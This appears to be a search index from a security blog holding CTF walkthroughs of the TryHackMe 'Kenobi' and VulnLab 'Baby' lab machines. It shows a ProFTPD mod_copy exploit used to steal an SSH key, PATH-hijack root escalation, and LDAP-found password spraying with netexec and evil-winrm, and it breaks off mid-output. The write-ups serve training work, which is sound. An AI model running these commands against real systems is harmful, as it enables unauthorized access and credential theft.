30\n\n[...SNIP...]\n</code></pre>","tags":["samba","ProFtpd","path-variable-manipulation"]},{"location":"blog/2024/06/07/tryhackme-kenobi.html#initial-access","title":"Initial Access","text":"<p>Checking exploit-db for exploits related to the ProFtpd version we identified, we see that there are 4 exploits found. </p> <p></p> <p>I'm going to grab the exploit 49908 using </p> <pre><code>$ searchsploit -m 49908\n</code></pre> <p>After modifying the exploit slightly, I was able to copy the <code>id_rsa</code> key from the <code>kenobi</code> user's home directory into the <code>/var/tmp/</code> directory so I'm able to access it though the share I mounted earlier. </p> <pre><code>$ python3 49908.py 10.10.68.225\n\n220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.68.225]\n\n350 File or directory exists, ready for destination name\n\n250 Copy successful\n\n350 File or directory exists, ready for destination name\n\n550 cpto: Permission denied\n\nExploit Completed\n[!] Something Went Wrong\n[!] Directory might not be writable\n</code></pre> <p>After running the exploit, we can see that the key is now in the <code>/var/tmp</code> directory.</p> <p></p> <p>After changing the permissions on the key to 600 (<code>chmod 600 &lt;KEY&gt;</code>) we're able to ssh into the box as the <code>kenobi</code> user. </p> <pre><code>$ ssh -i kenobi kenobi@$ip\n\nThe authenticity of host '10.10.68.225 (10.10.68.225)' can't be established.\nED25519 key fingerprint is SHA256:GXu1mgqL0Wk2ZHPmEUVIS0hvusx4hk33iTcwNKPktFw.\nThis key is not known by any other names.\nAre you sure you want to continue connecting (yes/no/[fingerprint])? yes\nWarning: Permanently added '10.10.68.225' (ED25519) to the list of known hosts.\nWelcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.8.0-58-generic x86_64)\n\n * Documentation:  https://help.ubuntu.com\n * Management:     https://landscape.canonical.com\n * Support:        https://ubuntu.com/advantage\n\n103 packages can be updated.\n65 updates are security updates.\n\n\nLast login: Wed Sep  4 07:10:15 2019 from 192.168.1.147\nTo run a command as administrator (user \"root\"), use \"sudo &lt;command&gt;\".\nSee \"man sudo_root\" for details.\n\nkenobi@kenobi:~$\n</code></pre>","tags":["samba","ProFtpd","path-variable-manipulation"]},{"location":"blog/2024/06/07/tryhackme-kenobi.html#privilege-escalation","title":"Privilege Escalation","text":"<p>We can list SUID binaries with the following command:</p> <pre><code>$ find / -perm -u=s -type f 2&gt;/dev/null\n</code></pre> <p>One stands out as odd.</p> <p></p> <p>Running that binary, we're presented with three options. </p> <p></p> <p>Running through all the options once, it seems pretty straightforward, so we'll need to figure out a way to abuse it.</p> <pre><code>kenobi@kenobi:~$ /usr/bin/menu\n\n***************************************\n1. status check\n2. kernel version\n3. ifconfig\n** Enter your choice :1\nHTTP/1.1 200 OK\nDate: Fri, 07 Jun 2024 18:48:27 GMT\nServer: Apache/2.4.18 (Ubuntu)\nLast-Modified: Wed, 04 Sep 2019 09:07:20 GMT\nETag: \"c8-591b6884b6ed2\"\nAccept-Ranges: bytes\nContent-Length: 200\nVary: Accept-Encoding\nContent-Type: text/html\n\nkenobi@kenobi:~$ /usr/bin/menu\n\n***************************************\n1. status check\n2. kernel version\n3. ifconfig\n** Enter your choice :2\n4.8.0-58-generic\nkenobi@kenobi:~$ /usr/bin/menu\n\n***************************************\n1. status check\n2. kernel version\n3. ifconfig\n** Enter your choice :3\neth0      Link encap:Ethernet  HWaddr 02:b9:3b:22:86:a7\n          inet addr:10.10.68.225  Bcast:10.10.255.255  Mask:255.255.0.0\n          inet6 addr: fe80::b9:3bff:fe22:86a7/64 Scope:Link\n          UP BROADCAST RUNNING MULTICAST  MTU:9001  Metric:1\n          RX packets:148597 errors:0 dropped:0 overruns:0 frame:0\n          TX packets:148174 errors:0 dropped:0 overruns:0 carrier:0\n          collisions:0 txqueuelen:1000\n          RX bytes:7005333 (7.0 MB)  TX bytes:9676051 (9.6 MB)\n\nlo        Link encap:Local Loopback\n          inet addr:127.0.0.1  Mask:255.0.0.0\n          inet6 addr: ::1/128 Scope:Host\n          UP LOOPBACK RUNNING  MTU:65536  Metric:1\n          RX packets:218 errors:0 dropped:0 overruns:0 frame:0\n          TX packets:218 errors:0 dropped:0 overruns:0 carrier:0\n          collisions:0 txqueuelen:1\n          RX bytes:16277 (16.2 KB)  TX bytes:16277 (16.2 KB)\n</code></pre> <p>We can see when we run strings on the binary, that the actual commands that are being run are listed there. You'll also notice that they're not being called with absolute paths, so it might be possible to trick this binary into running something of our choosing. </p> <p>To do this, I'm going to copy <code>/bin/bash</code> to my home directory, and then modify my <code>PATH</code> environment variable to tell the system to essentially \"Look for everything HERE first...\". </p> <p>First, copy the <code>/bin/bash</code> binary to the home directory. </p> <pre><code>kenobi@kenobi:~$ cp /bin/bash .\n</code></pre> <p>Then, we can confirm that the <code>bash</code> binary is present in the home directory now.</p> <pre><code>kenobi@kenobi:~$ ls -la\ntotal 1056\ndrwxr-xr-x 5 kenobi kenobi    4096 Jun  7 13:55 .\ndrwxr-xr-x 3 root   root      4096 Sep  4  2019 ..\n-rwxr-xr-x 1 kenobi kenobi 1037528 Jun  7 13:55 bash\nlrwxrwxrwx 1 root   root         9 Sep  4  2019 .bash_history -&gt; /dev/null\n-rw-r--r-- 1 kenobi kenobi     220 Sep  4  2019 .bash_logout\n-rw-r--r-- 1 kenobi kenobi    3771 Sep  4  2019 .bashrc\ndrwx------ 2 kenobi kenobi    4096 Sep  4  2019 .cache\n-rw-r--r-- 1 kenobi kenobi     655 Sep  4  2019 .profile\ndrwxr-xr-x 2 kenobi kenobi    4096 Sep  4  2019 share\ndrwx------ 2 kenobi kenobi    4096 Sep  4  2019 .ssh\n-rw-rw-r-- 1 kenobi kenobi      33 Sep  4  2019 user.txt\n-rw------- 1 kenobi kenobi     642 Sep  4  2019 .viminfo\n</code></pre> <p>Since we're attempting to trick the application into running our binary instead of the one it's supposed to run, we need to change the name of the <code>bash</code> binary to <code>ifconfig</code></p> <pre><code>kenobi@kenobi:~$ mv bash ifconfig\n</code></pre> <p>We also need to set the permissions on the copied <code>bash</code> binary to make sure that it doesn't drop privileges. </p> <pre><code>$ chmod 4777 ifconfig\n</code></pre> <p>Once we've done that, we can add the current working directory (<code>/home/kenobi</code> in my case) to the <code>PATH</code> environment variable. </p> <pre><code>kenobi@kenobi:~$ export PATH=.:$PATH\n</code></pre> <p>Running the <code>/usr/bin/menu</code> binary again and selecting option 3 causes the application to run OUR version of <code>bash</code> and gives us a shell as root. </p> <p></p>","tags":["samba","ProFtpd","path-variable-manipulation"]},{"location":"blog/2024/06/29/vulnlab-baby.html","title":"VulnLab: Baby","text":"<p>Baby is an EASY difficulty machine on VulnLab. This machine involved performing LDAP enumeration to identify valid domain users and locate a plaintext password in one of the user description fields. By spraying that password across all the identified users, we find one that requires a password change, which once complete gives us an initial shell on the box. Once on the box, we discover that the current user has backup privileges, which allow us to create a copy of the drive and extract the NTDS.dit. That, along with the SAM and SYSTEM hives, allow us to dump all domain credentials with <code>secretsdump.py</code>. </p> <p></p>","tags":["ldap","backup","secretsdump"]},{"location":"blog/2024/06/29/vulnlab-baby.html#enumeration","title":"Enumeration","text":"","tags":["ldap","backup","secretsdump"]},{"location":"blog/2024/06/29/vulnlab-baby.html#nmap","title":"Nmap","text":"<pre><code>PORT      STATE SERVICE       REASON          VERSION\n53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus\n88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2024-06-21 11:52:19Z)\n135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC\n139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn\n389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: baby.vl0., Site: Default-First-Site-Name)\n445/tcp   open  microsoft-ds? syn-ack ttl 127\n464/tcp   open  kpasswd5?     syn-ack ttl 127\n593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0\n636/tcp   open  tcpwrapped    syn-ack ttl 127\n3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: baby.vl0., Site: Default-First-Site-Name)\n3269/tcp  open  tcpwrapped    syn-ack ttl 127\n3389/tcp  open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services\n| ssl-cert: Subject: commonName=BabyDC.baby.vl\n| Issuer: commonName=BabyDC.baby.vl\n| Public Key type: rsa\n| Public Key bits: 2048\n| Signature Algorithm: sha256WithRSAEncryption\n| Not valid before: 2024-06-20T11:21:52\n| Not valid after:  2024-12-20T11:21:52\n| MD5:   1553:8e6f:d6f7:6a63:9c3e:fb81:d241:adb2\n| SHA-1: bc71:79c1:6c0c:ae2b:00f6:ec7f:7b4e:8dbf:31a0:c22e\n| -----BEGIN CERTIFICATE-----\n| MIIC4DCCAcigAwIBAgIQFcXuQwk5Mr5Iro4L87Y/gjANBgkqhkiG9w0BAQsFADAZ\n| MRcwFQYDVQQDEw5CYWJ5REMuYmFieS52bDAeFw0yNDA2MjAxMTIxNTJaFw0yNDEy\n| MjAxMTIxNTJaMBkxFzAVBgNVBAMTDkJhYnlEQy5iYWJ5LnZsMIIBIjANBgkqhkiG\n| 9w0BAQEFAAOCAQ8AMIIBCgKCAQEAuquv0xygIC6VYkeMb0xvhqlKSP4NuWZgS1rw\n| vohVW8/SdsUY2CLaXpR7csnkVI3nNvxYOv35qm/LfrUrMvbbT5YCPo5jqy6tp9Df\n| 5+EwK3vnY3fdY3GaXEDifkp1J132+ZGM+SQx1paCj5uTsXYrlCLSO6EFvqCB+mfU\n| vRD8FPmbY+FA2Cd7gSK2J6gF854PiOwMIUT9HRy+0J2xVzAKTAMxgF5w+9YMucvN\n| SLFmWVqQZcRFk0yVWwtbVxv/OT4Lsz3uyWmZFV+5d+8zd1S+W+BqeremGsW47xWP\n| kZQRBaXMtyggG4ymVT2jZDkGroSBi10OeGsGTrsrY6xEstAQ3QIDAQABoyQwIjAT\n| BgNVHSUEDDAKBggrBgEFBQcDATALBgNVHQ8EBAMCBDAwDQYJKoZIhvcNAQELBQAD\n| ggEBAD4PWAN6BB8rb1EBve9LNkXUWHSb0m4u2LYjGVfSXI4aeXULELMTpX8Kf1Oy\n| 5+Voaij0stmH+pcYfhzcnZz6cSYbhk2JRphfyRVmtppHAK5jKrk5ut4lr4XiWItp\n| qOqZcKzcWfThp92LRwx+2dx8YEXBzLQVnAAcbXe7VbM3qJHHu/RChQHYb9+u0Czr\n| 8ut/5n9XPPOLO3FLVmJ7EHjWwFTAS+a6wPPqFdzKtR2DJ3T7DhwXVmqG5AGY+JFS\n| ShFRSOmEc1joekHyNYuwfPNQk/TCdKyFt76N6tMcq70CRpDNaSOCp3r5cvSY2BH+\n| 2X2UcOYxSOiC0YEv8SxBCirWoJA=\n|_-----END CERTIFICATE-----\n| rdp-ntlm-info: \n|   Target_Name: BABY\n|   NetBIOS_Domain_Name: BABY\n|   NetBIOS_Computer_Name: BABYDC\n|   DNS_Domain_Name: baby.vl\n|   DNS_Computer_Name: BabyDC.baby.vl\n|   Product_Version: 10.0.20348\n|_  System_Time: 2024-06-21T11:53:09+00:00\n|_ssl-date: 2024-06-21T11:53:49+00:00; 0s from scanner time.\n5357/tcp  open  tcpwrapped    syn-ack ttl 127\n5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-server-header: Microsoft-HTTPAPI/2.0\n|_http-title: Not Found\n9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing\n49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC\n49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC\n49668/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC\n49674/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0\n49675/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC\n56612/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC\n64285/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC\n</code></pre>","tags":["ldap","backup","secretsdump"]},{"location":"blog/2024/06/29/vulnlab-baby.html#service-footprinting","title":"Service footprinting","text":"","tags":["ldap","backup","secretsdump"]},{"location":"blog/2024/06/29/vulnlab-baby.html#ldap-enumeration","title":"LDAP Enumeration","text":"<p>Initial checks didn't return anything for me, but once I added the base naming context, I got some results. </p> <pre><code>\u3009ldapsearch -x -H ldap://$ip -b \"DC=baby,DC=vl\" \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0  \n# extended LDIF  \n#  \n# LDAPv3  \n# base &lt;DC=baby,DC=vl&gt; with scope subtree  \n# filter: (objectclass=*)  \n# requesting: ALL  \n#  \n\n# baby.vl  \ndn: DC=baby,DC=vl  \n\n# Administrator, Users, baby.vl  \ndn: CN=Administrator,CN=Users,DC=baby,DC=vl  \n\n[...SNIP...]\n\n# Teresa Bell, it, baby.vl  \ndn: CN=Teresa Bell,OU=it,DC=baby,DC=vl  \nobjectClass: top  \nobjectClass: person  \nobjectClass: organizationalPerson  \nobjectClass: user  \ncn: Teresa Bell  \nsn: Bell  \ndescription: Set initial password to BabyStart123!  \ngivenName: Teresa  \ndistinguishedName: CN=Teresa Bell,OU=it,DC=baby,DC=vl  \ninstanceType: 4  \nwhenCreated: 20211121151108.0Z  \nwhenChanged: 20211121151437.0Z  \ndisplayName: Teresa Bell  \nuSNCreated: 12889  \nmemberOf: CN=it,CN=Users,DC=baby,DC=vl  \nuSNChanged: 12905  \nname: Teresa Bell  \nobjectGUID:: EDGXW4JjgEq7+GuyHBu3QQ==  \nuserAccountControl: 66080  \nbadPwdCount: 0  \ncodePage: 0  \ncountryCode: 0  \nbadPasswordTime: 0  \nlastLogoff: 0  \nlastLogon: 0  \npwdLastSet: 132819812778759642  \nprimaryGroupID: 513  \nobjectSid:: AQUAAAAAAAUVAAAAf1veU67Ze+7mkhtWWgQAAA==  \naccountExpires: 9223372036854775807  \nlogonCount: 0  \nsAMAccountName: Teresa.Bell  \nsAMAccountType: 805306368  \nuserPrincipalName: Teresa.Bell@baby.vl  \nobjectCategory: CN=Person,CN=Schema,CN=Configuration,DC=baby,DC=vl  \ndSCorePropagationData: 20211121163014.0Z  \ndSCorePropagationData: 20211121162927.0Z  \ndSCorePropagationData: 16010101000416.0Z  \nmsDS-SupportedEncryptionTypes: 0  \n\n[...SNIP...]\n</code></pre> <p>Note the description field for the <code>Teresa.Bell</code> user.</p> <pre><code>description: Set initial password to BabyStart123!\n</code></pre> <p>We can get a full list of users with the following command:</p> <pre><code>\u3009ldapsearch -x -H ldap://$ip -b \"DC=baby,DC=vl\" \"users\" | grep dn  \ndn: DC=baby,DC=vl  \ndn: CN=Administrator,CN=Users,DC=baby,DC=vl  \ndn: CN=Guest,CN=Users,DC=baby,DC=vl  \ndn: CN=krbtgt,CN=Users,DC=baby,DC=vl  \ndn: CN=Domain Computers,CN=Users,DC=baby,DC=vl  \ndn: CN=Domain Controllers,CN=Users,DC=baby,DC=vl  \ndn: CN=Schema Admins,CN=Users,DC=baby,DC=vl  \ndn: CN=Enterprise Admins,CN=Users,DC=baby,DC=vl  \ndn: CN=Cert Publishers,CN=Users,DC=baby,DC=vl  \ndn: CN=Domain Admins,CN=Users,DC=baby,DC=vl  \ndn: CN=Domain Users,CN=Users,DC=baby,DC=vl  \ndn: CN=Domain Guests,CN=Users,DC=baby,DC=vl  \ndn: CN=Group Policy Creator Owners,CN=Users,DC=baby,DC=vl  \ndn: CN=RAS and IAS Servers,CN=Users,DC=baby,DC=vl  \ndn: CN=Allowed RODC Password Replication Group,CN=Users,DC=baby,DC=vl  \ndn: CN=Denied RODC Password Replication Group,CN=Users,DC=baby,DC=vl  \ndn: CN=Read-only Domain Controllers,CN=Users,DC=baby,DC=vl  \ndn: CN=Enterprise Read-only Domain Controllers,CN=Users,DC=baby,DC=vl  \ndn: CN=Cloneable Domain Controllers,CN=Users,DC=baby,DC=vl  \ndn: CN=Protected Users,CN=Users,DC=baby,DC=vl  \ndn: CN=Key Admins,CN=Users,DC=baby,DC=vl  \ndn: CN=Enterprise Key Admins,CN=Users,DC=baby,DC=vl  \ndn: CN=DnsAdmins,CN=Users,DC=baby,DC=vl  \ndn: CN=DnsUpdateProxy,CN=Users,DC=baby,DC=vl  \ndn: CN=dev,CN=Users,DC=baby,DC=vl  \ndn: CN=Jacqueline Barnett,OU=dev,DC=baby,DC=vl  \ndn: CN=Ashley Webb,OU=dev,DC=baby,DC=vl  \ndn: CN=Hugh George,OU=dev,DC=baby,DC=vl  \ndn: CN=Leonard Dyer,OU=dev,DC=baby,DC=vl  \ndn: CN=Ian Walker,OU=dev,DC=baby,DC=vl  \ndn: CN=it,CN=Users,DC=baby,DC=vl  \ndn: CN=Connor Wilkinson,OU=it,DC=baby,DC=vl  \ndn: CN=Caroline Robinson,OU=it,DC=baby,DC=vl  \ndn: CN=Joseph Hughes,OU=it,DC=baby,DC=vl  \ndn: CN=Kerry Wilson,OU=it,DC=baby,DC=vl  \ndn: CN=Teresa Bell,OU=it,DC=baby,DC=vl\n</code></pre> <p>Getting rid of all the groups we get the following list. </p> <pre><code>\u3009cat users.txt  \nadministrator  \nguest  \njacqueline.barnett  \nashley.webb  \nhugh.george  \nleonard.dyer  \nian.walker  \nconnor.wilkinson  \ncaroline.robinson  \njoseph.hughes  \nkerry.wilson  \nteresa.bell\n</code></pre>","tags":["ldap","backup","secretsdump"]},{"location":"blog/2024/06/29/vulnlab-baby.html#foothold","title":"Foothold","text":"<p>Now we can use <code>netexec</code> to spray the previously discovered password against the list of domain users. </p> <pre><code>\u3009nxc smb $ip -u users.txt -p 'BabyStart123!'  \nSMB \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a010.10.65.95 \u00a0\u00a0\u00a0\u00a0445 \u00a0\u00a0\u00a0BABYDC \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0[*] Windows Server 2022 Build 20348 x64 (name:BA  \nBYDC) (domain:baby.vl) (signing:True) (SMBv1:False)  \nSMB \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a010.10.65.95 \u00a0\u00a0\u00a0\u00a0445 \u00a0\u00a0\u00a0BABYDC \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0[-] baby.vl\\administrator:BabyStart123! STATUS_L  \nOGON_FAILURE  \nSMB \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a010.10.65.95 \u00a0\u00a0\u00a0\u00a0445 \u00a0\u00a0\u00a0BABYDC \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0[-] baby.vl\\guest:BabyStart123! STATUS_LOGON_FAI  \nLURE  \nSMB \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a010.10.65.95 \u00a0\u00a0\u00a0\u00a0445 \u00a0\u00a0\u00a0BABYDC \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0[-] baby.vl\\jacqueline.barnett:BabyStart123! STA  \nTUS_LOGON_FAILURE  \nSMB \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a010.10.65.95 \u00a0\u00a0\u00a0\u00a0445 \u00a0\u00a0\u00a0BABYDC \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0[-] baby.vl\\ashley.webb:BabyStart123! STATUS_LOG  \nON_FAILURE  \nSMB \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a010.10.65.95 \u00a0\u00a0\u00a0\u00a0445 \u00a0\u00a0\u00a0BABYDC \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0[-] baby.vl\\hugh.george:BabyStart123! STATUS_LOG  \nON_FAILURE  \nSMB \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a010.10.65.95 \u00a0\u00a0\u00a0\u00a0445 \u00a0\u00a0\u00a0BABYDC \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0[-] baby.vl\\leonard.dyer:BabyStart123! STATUS_LO  \nGON_FAILURE  \nSMB \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a010.10.65.95 \u00a0\u00a0\u00a0\u00a0445 \u00a0\u00a0\u00a0BABYDC \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0[-] baby.vl\\ian.walker:BabyStart123! STATUS_LOGO  \nN_FAILURE  \nSMB \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a010.10.65.95 \u00a0\u00a0\u00a0\u00a0445 \u00a0\u00a0\u00a0BABYDC \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0[-] baby.vl\\connor.wilkinson:BabyStart123! STATU  \nS_LOGON_FAILURE  \nSMB \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a010.10.65.95 \u00a0\u00a0\u00a0\u00a0445 \u00a0\u00a0\u00a0BABYDC \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0[-] baby.vl\\caroline.robinson:BabyStart123! STAT  \nUS_PASSWORD_MUST_CHANGE  \nSMB \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a010.10.65.95 \u00a0\u00a0\u00a0\u00a0445 \u00a0\u00a0\u00a0BABYDC \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0[-] baby.vl\\joseph.hughes:BabyStart123! STATUS_L  \nOGON_FAILURE  \nSMB \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a010.10.65.95 \u00a0\u00a0\u00a0\u00a0445 \u00a0\u00a0\u00a0BABYDC \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0[-] baby.vl\\kerry.wilson:BabyStart123! STATUS_LO  \nGON_FAILURE  \nSMB \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a010.10.65.95 \u00a0\u00a0\u00a0\u00a0445 \u00a0\u00a0\u00a0BABYDC \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0[-] baby.vl\\teresa.bell:BabyStart123! STATUS_LOG  \nON_FAILURE  \nSMB \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a010.10.65.95 \u00a0\u00a0\u00a0\u00a0445 \u00a0\u00a0\u00a0BABYDC \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0[-] baby.vl\\:BabyStart123! STATUS_LOGON_FAILURE\n</code></pre> <p>Note that we need to change caroline robinson's password. </p> <pre><code>SMB \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a010.10.65.95 \u00a0\u00a0\u00a0\u00a0445 \u00a0\u00a0\u00a0BABYDC \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0[-] baby.vl\\caroline.robinson:BabyStart123! STAT  \nUS_PASSWORD_MUST_CHANGE\n</code></pre> <p>We can change it with <code>smbpasswd</code>. </p> <pre><code>\u3009smbpasswd -r $ip -U BABY.vl/caroline.robinson  \nOld SMB password:  \nNew SMB password:  \nRetype new SMB password:  \nPassword changed for user caroline.robinson\n</code></pre> <p>Once the password is changed, we can confirm it with <code>netexec</code>. </p> <pre><code>\u3009nxc smb $ip -u caroline.robinson -p 'P@ssw0rd123!'  \nSMB \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a010.10.65.95 \u00a0\u00a0\u00a0\u00a0445 \u00a0\u00a0\u00a0BABYDC \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0[*] Windows Server 2022 Build 20348 x64 (name:BA  \nBYDC) (domain:baby.vl) (signing:True) (SMBv1:False)  \nSMB \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a010.10.65.95 \u00a0\u00a0\u00a0\u00a0445 \u00a0\u00a0\u00a0BABYDC \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0[+] baby.vl\\caroline.robinson:P@ssw0rd123!\n</code></pre> <p>Perfect! Now that we have a valid credential for the <code>caroline.robinson</code> user, we can log into the machine with <code>evil-winrm</code>. </p> <pre><code>\u3009evil-winrm -i $ip -u 'caroline.robinson' -p 'P@ssw0rd123!'  \n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0  \nEvil-WinRM shell v3.5  \n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0  \nWarning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() functi  \non is unimplemented on this machine  \n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0  \nData: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remot  \ne-path-completion  \n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0  \nInfo: Establishing connection to remote endpoint  \n*Evil-WinRM* PS C:\\Users\\Caroline.Robinson\\Documents&gt;\n</code></pre> <p>Grab the user flag and start enumerating. </p>","tags":["ldap","backup","secretsdump"]},{"location":"blog/2024/06/29/vulnlab-baby.html#privilege-escalation","title":"Privilege Escalation","text":"<p>Checking our current privileges, we find that <code>caroline.robinson</code> has the <code>SeBackupPrivilege</code> enabled. With this privilege enabled, the user can bypass file and directory restrictions for the purpose of backing them up. This privilege causes the system to grant all read access to any file, regardless of the access control list specified for the file. </p> <p>4672(S) Special privileges assigned to new logon. - Windows 10 | Microsoft Learn</p> <pre><code>*Evil-WinRM* PS C:\\Users\\Caroline.Robinson\\Documents&gt; whoami /all  \n\nUSER INFORMATION  \n----------------  \n\nUser Name \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0SID  \n====================== ==============================================  \nbaby\\caroline.robinson S-1-5-21-1407081343-4001094062-1444647654-1111  \n\n\nGROUP INFORMATION  \n-----------------  \n\nGroup Name \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Type \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0SID \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0  \n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Attributes  \n========================================== ================ ========================================  \n====== ==================================================  \nEveryone \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Well-known group S-1-1-0 \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0  \n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Mandatory group, Enabled by default, Enabled group  \nBUILTIN\\Backup Operators \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Alias 